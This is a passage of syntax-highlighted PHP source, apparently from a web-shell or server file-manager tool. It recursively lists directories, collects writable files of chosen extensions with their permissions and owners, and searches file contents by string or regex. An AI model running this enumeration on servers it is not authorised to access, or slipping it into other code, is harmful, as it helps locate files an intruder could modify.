<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dirdata</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">j</span>][<span style="color: #8abeb7;">'dirperm'</span>]=getPerms(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">f</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dirdata</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">j</span>][<span style="color: #8abeb7;">'dirlink'</span>]=<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dir</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dirdata</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">j</span>][<span style="color: #8abeb7;">'server_link'</span>]=<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">f</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">j</span>++;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   GetWDirList(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">f</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   closedir(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dh</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   clearstatcache();
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dirdata</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> <span style="color: #b5bd68;">array</span>();
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
}

<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">GetWFileList</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dir</span>){
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">global</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filedata</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">j</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">nowpath</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">writabledb</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #81a2be;">!</span><span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">j</span> &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">j</span>=1;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dh</span> = opendir(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dir</span>)) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">while</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">file</span> = readdir(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dh</span>)) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">ext</span> = getext(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">file</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">f</span>=str_replace(<span style="color: #8abeb7;">'//'</span>,<span style="color: #8abeb7;">'/'</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dir</span>.<span style="color: #8abeb7;">'/'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">file</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">file</span>!=<span style="color: #8abeb7;">'.'</span> &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">file</span>!=<span style="color: #8abeb7;">'..'</span> &amp;&amp; is_dir(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">f</span>)){
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   GetWFileList(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">f</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">elseif</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">file</span>!=<span style="color: #8abeb7;">'.'</span> &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">file</span>!=<span style="color: #8abeb7;">'..'</span> &amp;&amp; is_file(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">f</span>) &amp;&amp; in_array(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">ext</span>, <span style="text-decoration: underline;">explode(</span><span style="color: #8abeb7; text-decoration: underline;">','</span><span style="text-decoration: underline;">, </span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">writabledb</span><span style="text-decoration: underline;">))){</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (is_writable(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">f</span>)) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filedata</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">j</span>][<span style="color: #8abeb7;">'filename'</span>]=str_replace(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">nowpath</span>,<span style="color: #8abeb7;">''</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">f</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filedata</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">j</span>][<span style="color: #8abeb7;">'size'</span>]=sizecount(<span style="color: #81a2be;">@filesize</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">f</span>));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filedata</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">j</span>][<span style="color: #8abeb7;">'mtime'</span>]=<span style="color: #b5bd68;">@date</span>(<span style="color: #8abeb7;">'Y-m-d H:i:s'</span>,filemtime(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">f</span>));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filedata</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">j</span>][<span style="color: #8abeb7;">'filechmod'</span>]=getChmod(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">f</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filedata</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">j</span>][<span style="color: #8abeb7;">'fileperm'</span>]=getPerms(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">f</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filedata</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">j</span>][<span style="color: #8abeb7;">'fileowner'</span>]=getUser(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">f</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filedata</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">j</span>][<span style="color: #8abeb7;">'dirlink'</span>]=<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dir</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filedata</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">j</span>][<span style="color: #8abeb7;">'server_link'</span>]=<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">f</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">j</span>++;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   closedir(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dh</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   clearstatcache();
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filedata</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> <span style="color: #b5bd68;">array</span>();
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
}

<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">GetSFileList</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dir</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">content</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">re</span> = 0) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">global</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filedata</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">j</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">nowpath</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">writabledb</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #81a2be;">!</span><span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">j</span> &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">j</span>=1;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dh</span> = opendir(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dir</span>)) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">while</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">file</span> = readdir(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dh</span>)) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">ext</span> = getext(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">file</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">f</span>=str_replace(<span style="color: #8abeb7;">'//'</span>,<span style="color: #8abeb7;">'/'</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dir</span>.<span style="color: #8abeb7;">'/'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">file</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">file</span>!=<span style="color: #8abeb7;">'.'</span> &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">file</span>!=<span style="color: #8abeb7;">'..'</span> &amp;&amp; is_dir(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">f</span>)){
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   GetSFileList(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">f</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">content</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">re</span> = 0);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">elseif</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">file</span>!=<span style="color: #8abeb7;">'.'</span> &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">file</span>!=<span style="color: #8abeb7;">'..'</span> &amp;&amp; is_file(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">f</span>) &amp;&amp; in_array(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">ext</span>, <span style="text-decoration: underline;">explode(</span><span style="color: #8abeb7; text-decoration: underline;">','</span><span style="text-decoration: underline;">, </span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">writabledb</span><span style="text-decoration: underline;">))){</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">find</span> = 0;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">re</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> ( preg_match(<span style="color: #8abeb7;">'@'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">content</span>.<span style="color: #8abeb7;">'@'</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">file</span>) || preg_match(<span style="color: #8abeb7;">'@'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">c</span><span style="color: #f0c674; text-decoration: underline;">ontent</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">'@'</span><span style="text-decoration: underline;">, @file_get_contents(</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">f</span><span style="text-decoration: underline;">)) ){</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">find</span> = 1;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> ( strstr(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">file</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">content</span>) || strstr( @file_get_contents(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674; text-decoration: underline;">f</span><span style="text-decoration: underline;">),</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">content</span><span style="text-decoration: underline;"> ) ) {</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">find</span> = 1;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">find</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filedata</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">j</span>][<span style="color: #8abeb7;">'filename'</span>]=str_replace(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">nowpath</span>,<span style="color: #8abeb7;">''</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">f</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filedata</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">j</span>][<span style="color: #8abeb7;">'size'</span>]=sizecount(<span style="color: #81a2be;">@filesize</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">f</span>));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filedata</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">j</span>][<span style="color: #8abeb7;">'mtime'</span>]=<span style="color: #b5bd68;">@date</span>(<span style="color: #8abeb7;">'Y-m-d H:i:s'</span>,filemtime(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">f</span>));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filedata</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">j</span>][<span style="color: #8abeb7;">'filechmod'</span>]=getChmod(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">f</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filedata</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">j</span>][<span style="color: #8abeb7;">'fileperm'</span>]=getPerms(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">f</span>);
